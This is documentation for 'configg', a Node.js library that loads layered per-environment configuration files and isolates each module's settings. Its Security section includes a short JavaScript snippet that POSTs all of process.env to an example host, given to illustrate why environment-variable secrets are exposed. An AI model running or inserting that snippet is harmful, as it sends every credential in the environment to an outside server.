# configg Documentation

"configg" organizes _hierarchical_ configurations for your App
deployments while keeping the different configurations for your App and
its Modules _isolated_.

Starting from  a defined set of default parameters, your App gets
extended for its different deployment environments (development,
staging, production, ...), optional the hosts it's going to run and/or
the instance it uses.

The different environments get controlled using different environment
variables (e.g. `$NODE_ENV` for deployment).

To provide a clean separation between code and config, as proclaimed by
[The Twelve-Factor App][], each App or Module can get its own
configuration for the different deployment environments. But that's it
with [The Twelve-Factor App][], please read further in the
[Security](#security) section, why "configg" is different.

Configurations are stored in configuration files inside the `/config`
folder which resides next to a `package.json` file. Isolation (i.e. a
module or App can only access its associated configuration) is
maintained by extracting name and version from the `package.json` file.
This allows extending/ overwriting values for modules from your
App-config or even a Module which includes other Sub-Modules.

Credits and Acknoledgement go to [node-config][] for inspiration.

## Table of Contents

<!-- !toc (minlevel=2 omit="Table of Contents") -->

* [Installation](#installation)
* [Common Usage](#common-usage)
* [Environment Variables](#environment-variables)
  * [NODE_CONFIG_DIR](#node_config_dir)
  * [NODE_ENV](#node_env)
  * [HOSTNAME](#hostname)
  * [NODE_APP_INSTANCE](#node_app_instance)
  * [NODE_CONFIG](#node_config)
  * [DEBUG=configg](#debug-configg)
  * [NODE_CONFIG_STRICT_MODE](#node_config_strict_mode)
* [Overwriting](#overwriting)
* [Configuration files](#configuration-files)
  * [Config File Structure](#config-file-structure)
  * [Methods of the "config" object](#methods-of-the-config-object)
  * [File loading order](#file-loading-order)
  * [Extension loading](#extension-loading)
  * [Merging](#merging)
  * [Parsing Errors](#parsing-errors)
* [Security](#security)
* [References](#references)

<!-- toc! -->

## Installation

Every App or Module you like to enable with "configg" requires it as
dependency. Install with `npm` and save it into your `package.json`.

```bash
$ npm install --save configg
$ mkdir config
$ vi config/default.js
```
_config/default.js_

```js
module.exports = {
  config: { /* your config goes in here */ }
}
```
For a _configg_ enabled module please change `package.json` that way, that _configg_ appears as _peerDependency_.
Unfortunately this cannot be done via `npm` at the moment.
Alternatively use

```
yarn add -P configg
```

_package.json_

```json
{
  "name": "my-configg-enabled-module",
  ...
  "peerDependencies": {
    "configg": "^1.0.0"
  }
}
```

## Common Usage

**For modules:**

```js
var config = require('configg')()
// or explicitely naming the package root dir where `package.json` is located
var config = require('configg')(path.resolve(__dirname, '..'))
// obtain a value from the configuration
var value = config.get('config.key.subkey')
```

`__dirname` may point to the directory where the `package.json`
file is located together with a `config/` folder.

`value` can be read from a config like that:

```json
{
  "config": {
    "key": {
      "subkey": "value"
    }
  }
}
```

**Overwriting App/Module configs:**

For overwriting the App- or Module-Config the `NODE_CONFIG_DIR` env
variable or command line arg must be present. As primary key for
overwriting the package name from `package.json` must be present.

E.g. the name of your App in `package.json` is 'my-app'. It contains a
module named 'my-module' and another with a different version
'my-module@version':

```json
{
  "my-app": {
    "key": {
      "subkey": "value for app 'app-name'"
    }
  },
  "my-module" : {
    "key": "value for module"
  },
  "my-module@version": {
    "key": "value for module with a special version"
  }
}
```

Replace "my-app" with the name of the app you are launching.

Replace "my-module" with the name of your module according to its name
inside its `package.json` file.

Furthermore if you may have modules with the same name but of different
version, replace "my-module@version" with the module name and the semver
string from its `package.json` file. (E.g. "my-test@0.1.0").


## Environment Variables

"configg" uses some environment variable to control its behaviour. In
both cases, these are generally exported in your shell before loading
the app, but can also be supplied on the command line or in your app
bootstrap.

Example exporting to the OS before loading your app:

    export NODE_ENV=test
    node myapp.js

Example passing on the command line:

    NODE_ENV=test node myapp.js

Example passing on as command line arguments:

    node myapp.js --NODE_ENV=test

Example setting in JavaScript before the first load of "configg":

````js
process.env.NODE_ENV = 'test'
var config = require('configg')()
````

### NODE_CONFIG_DIR

This contains the path to the directory containing your
App-Configuration files.

If the environment variable or command line argument is not present the
configuration points to the "config" folder of the current working dir
(`process.cwd() + '/config'`).

If the path is relative (starts with a './' or '../') then the current
working directory is used (determinated by `process.cwd()`)

_This is disabled in v1.0.0 as this might cause problems when not installed using peerDependencies_
~~The current value of `NODE_CONFIG_DIR` is not available through
`config.common`. The setting is being deleted from `process.env` and
`process.argv` for security reasons.~~


### NODE_ENV

With `$NODE_ENV` the deployment environment of the App is controlled.
It is used for determating the right  [file loading
order](#File_loading_order).

Common values include "development", "test", "production", etc. but the
naming is up to your deployment strategy.

Regardless if this variable was set from the commandline or via
environment variable it can be requested via the common section of the
config

````js
var config = require('configg')()
console.log(config.common.NODE_ENV)
````

### HOSTNAME

The variable `$HOSTNAME` contains the name of your host server,
representing the hostname when determining config [file loading
order](#File_loading_order).

Sometimes the default hostname returned by `require('os').hostname()`
isn't what you expect, and setting this before running your App makes
sure you've got the right name.

The current value can be obtained from `config.common.HOSTNAME`.

````js
var config = require('configg')()
console.log(config.common.HOSTNAME)
````

### NODE_APP_INSTANCE

To support different configurations for each application instance
running on a machine, the `NODE_APP_INSTANCE` environment variable is
inspected, and used for loading instance specific files.

The current value can be obtained from
`config.common.NODE_APP_INSTANCE`.

````js
var config = require('configg')()
console.log(config.common.NODE_APP_INSTANCE)
````

### NODE_CONFIG

This allows you to override any configuration from the command line or
shell environment. The `NODE_CONFIG` environment variable must be a
[JSON][], [json5][] or [Hjson][] formatted string. Any configurations
contained in this will override the App-Configs found and merged from
the config files.

If `NODE_CONFIG` is supplied both from the OS environment and the
command line, the command line values will be favoured.

**Example:**

```bash
$ export NODE_CONFIG='{"app-name":{"key":{ "subkey":"value"}}}'
$ node myapp.js
```

The current value of `NODE_CONFIG` is not available through
`config.common`. The setting is being deleted from `process.env` and
`process.argv` for security reasons.

### DEBUG=configg

If `DEBUG=configg` is set then each time "configg" is required the
returned config object will be printed to console using [debug][].

This env-settings allows you to quickly check which config gets loaded
for each module.

### NODE_CONFIG_STRICT_MODE

When strict mode is enabled (`NODE_CONFIG_STRICT_MODE=Y`), the
following conditions must be true or an exception will thrown at
require:

* The `NODE_CONFIG_DIR` must be explicitely set.

* If `NODE_ENV` is set, there must be an explicit config file matching
    `NODE_ENV`.

* If `NODE_APP_INSTANCE` is set, there must be an explicit config file
    matching `NODE_APP_INSTANCE`.

* If `NODE_CONFIG_STRICT_MODE=HOSTNAME` is set, there must be an
    explicit config file matching `HOSTNAME`

`NODE_ENV` must not match 'default' or 'local' to avoid ambiguity.

Strict mode is off by default.

## Overwriting

A configuration for an app or module is primarily bound to its
`./config` directory and then on the folder specified via
`NODE_CONFIG_DIR` (or implicitely via `process.cwd + '/config'`).

For each module/app at first the `./config` folder next the
`package.json` file gets loaded (basic) which at second get overwritten by the
files loaded from the folder given in `NODE_CONFIG_DIR` (extended).

**Example**

Given a sample project with one module:

    ├── index.js
    ├── package.json        (name=myapp)
    ├── configdir/          (extended) for myapp and mymodule
    ├── config/             (basic) for myapp
    └─┬ node_modules
      └─┬ mymodule
        ├── package.json    (name=mymodule)
        ├── config/         (basic) for mymodule

Running `node index.js --NODE_CONFIG_DIR=./configdir` first loads the
config files from `configdir`. Then the config for "myapp" would get
loaded from `config`. For `myapp` now `config` gets overwritten by
`configdir`.

For `mymodule` the files in folder `node_modules/mymodule/config` get
overwritten by `configdir`.

This means that independently of the depth of the "node_modules" depth
a "basic" config of a module can only get overwritten by the "extended"
one specified in `NODE_CONFIG_DIR`.

## Configuration files

All basic configuration files need to be stored in the `config/` folder
which needs to be in the same folder as the `package.json` of your
module or project.

    ├── package.json
    └─┬ config/
      ├── default.js
      └── development.js

### Config File Structure

A configuration file needs to contain a property called "config". Under
this property the custom attributes for your application or module goes
in.

**Basic Structure of a Config File using JSON**

````json
{
  "config": {
    "note": "your custom values go in here"
  },
  "common": {
    "note": "values you like to share among ALL modules go in here"
  }
}
````

They may also exist a "common" property for properties you like to share
alongside all your modules of your App.

`NODE_ENV`, `HOSTNAME` and `NODE_APP_INSTANCE` are set per default from
the environment vars or process arguments.

**Extended Structure for an App**

Needs to be set with `NODE_CONFIG_DIR` or `NODE_CONFIG`:

````json
{
  "app": {
    "note": "your custom values go in here"
  },
  "common": {
    "note": "values you like to share among ALL modules go in here"
  },
  "module1": {
    "note": "values for overwriting Module 1 go in here"
  },
  "module1@0.1.0": {
    "note": "values for overwriting Module 1 with exact version 0.1.0 go in here"
  },
  "moduleN": {
    "note": "values for overwriting Module N go in here"
  }
}
````

The extended format should not contain a "config" property. Instead the
module/app name from the `package.json` file needs to be used. This
then guarantees an isolated overwrite for that specific module or app.

Various file formats are supported. Please check [Extension
loading](Extension_loading).

### Methods of the "config" object

On `config`, `config.config` and `config.common` you can use the
following method. Please make sure not to use any of these properties
within your configuration.

#### .get(keys)

> Securely get a value from the config according to `keys`.

**Example:**

```js
var config = require('configg')()
// => { config: { one: { a: 1 } } }
config.get('config.one.a')
// => 1
config.config.get(['one','b','notthere'])
// => undefined
```

**Parameters:**

- `{String | Array} keys` - dot separated string or Array to gather
  `value` from the config

**Return:**

`{Any}` value found using keys or undefined

<a name="File_loading_order"/>

### File loading order

The configuration files are loaded in the following order:

    default.{ext}
    default-{instance}.{ext}
    {deployment}.{ext}
    {deployment}-{instance}.{ext}
    {hostname}.{ext}
    {hostname}-{instance}.{ext}
    {hostname}-{deployment}.{ext}
    {hostname}-{deployment}-{instance}.{ext}
    local.{ext}
    local-{instance}.{ext}
    local-{deployment}.{ext}
    local-{deployment}-{instance}.{ext}

Where:

* `default` : This is the default configuration for the Module or App.
  This configuration should be defined in every case.

* `{deployment}` :
  Is the deployment name which is read from the `$NODE_ENV` environment
  variable. Typical values are "development" and "production". Anyhow
  you can use any name which fits your needs.

* `{hostname}` : Is the hostname of your server taken from the
  `$HOSTNAME` environment variable. If none is set, then
  `os.hostname()` is used to get the hostname from the OS.

* `{instance}` : Is an optional instance for Multi-Instance-Deployments
  which is read from the `$NODE_APP_INSTANCE` environment variable.

* `local` : The local files are intended to not be tracked in your
  version control system. External configuration management tools can
  write these files upon application deployment, before application
  loading.

* `{ext}` : Is the extension of the file.

**Example:**

| No. | Filename        | Note   |
| --: | :-------------- | :----- |
| 1.  | default.js      | A Javascript file with its default configuration. |
| 2.  | development.yml | A YAML file with only the diff settings from `default` for deployment "development". |
| 3.  | staging.hjson   | A HJSON file with only the diff settings from `default` for deployment "staging". |
| 4.  | production.yml  | A YAML file with only the diff settings from `default` for deployment "production". |
| 5.  | myserver.js     | A Javascript file with only the diff settings from `deployment` for HOST myserver. |
| 6.  | myserver-production.js | A Javascript file with only the diff settings from `myserver.js` for deployment "production". |
| 7.  | local.js        |  Local settings for the module, project |

In case of `NODE_ENV=development`, `HOSTNAME=myserver` the following files get loaded:

1. default.js
2. development.yml
3. myserver.js
4. local.js

For `NODE_ENV=production`, `HOSTNAME=myserver` the following files get
loaded:

1. default.js
2. production.yml
3. myserver.js
4. myserver-production.js
5. local.js

<a name="Extension_loading"/>

### Extension loading

File extensions can be mixed inside a configuration directory.
The first file encountered with a certain extension results in continuing
with the next file as described in [File loading order](#File_loading_order).

Supported files for parsing are (in order of resolution)

* [**.js**](../test/fixtures/myapp/config/default.js) : javascript
* [**.json**](../test/fixtures/myapp/config/default.json) : [JSON][]
* [**.json5**](../test/fixtures/myapp/config/default.json5) : [json5][]
* [**.hjson**](../test/fixtures/myapp/config/default.hjson) : [human json][Hjson]
* [**.yaml**](../test/fixtures/myapp/config/default.yaml) : [YAML][],
* [**.yml**](../test/fixtures/myapp/config/default.yml) : alternative [YAML][] extension

If using these file types please add the required dependencies to your project

* [**.coffee**](../test/fixtures/myapp/config/default.coffee) : coffee-script;
  install with `npm i -S coffeescript`
* [**.cson**](../test/fixtures/myapp/config/default.cson) : [CSON][];
  install with `npm i -S cson`
* [**.properties**](../test/fixtures/myapp/config/default.properties) : [Properties][];
  install with `npm i -S properties`
* [**.toml**](../test/fixtures/myapp/config/default.toml) : [TOML][];
  install with `npm i -S toml`

### Merging

All files get merged in by their loading order. Arrays will **not** get
extended but completely replaced instead. The underlying method for all
merging used [lodash merge](https://lodash.com/docs#merge).

### Parsing Errors

All errors encountered during parsing will throw an error immediately.
Errors are **never** catched to allow a developer to find the origin of
any error.

<a name="Security"/>

## Security

[The Twelve-Factor App][] proposes to store all configuration
information within environment variables. With this a complete
separation of code and config is achieved. Cool and simple.

On the other hand this introduces security risks which not everyone
likes to engage with (me included). Any shelled out exec (using
`require('child')`) has full access to your most intimate keys. The
same applies to any module you are requiring in your application.

Imagine this small code hidden somewhere...

````js
require('http')
.request({host:'gimmeyourconf.com', method: 'POST'})
.end(JSON.stringify(process.env));
````

This submits all your 12factor-Config in one single line. A bit of
obfuscation and all done.

This project aims to keep your config values there, where they are
needed. No other module should be able to get any details of another
modules- or even the Application-config.

We still *keep code and config separate* but now *isolating* app and
all modules from each other.

# Annex

## References

<!-- !ref -->

* [CSON][CSON]
* [debug][debug]
* [Hjson - the Human JSON][Hjson]
* [JSON - JavaScript Object Notation][JSON]
* [json5 - JSON for the ES5 era][json5]
* [node-config][node-config]
* [Properties][Properties]
* [The Twelve-Factor App][The Twelve-Factor App]
* [TOML - Tom's Obvious, Minimal Language.][TOML]
* [YAML Ain't Markup Language][YAML]
* [YAML-Parser][YAML-Parser]

<!-- ref! -->

[JSON]: http://json.org/ "JSON - JavaScript Object Notation"
[json5]: https://www.npmjs.com/package/json5 "json5 - JSON for the ES5 era"
[Hjson]: http://laktak.github.io/hjson/ "Hjson - the Human JSON"
[TOML]: https://github.com/toml-lang/toml "TOML - Tom's Obvious, Minimal Language."
[YAML]: http://yaml.org/ "YAML Ain't Markup Language"
[YAML-Parser]: https://www.npmjs.com/package/js-yaml
[CSON]: https://www.npmjs.com/package/cson
[Properties]: http://docs.oracle.com/javase/7/docs/api/java/util/Properties.html#load

[debug]: https://github.com/visionmedia/debug

[The Twelve-Factor App]: http://12factor.net
[node-config]: https://github.com/lorenwest/node-config
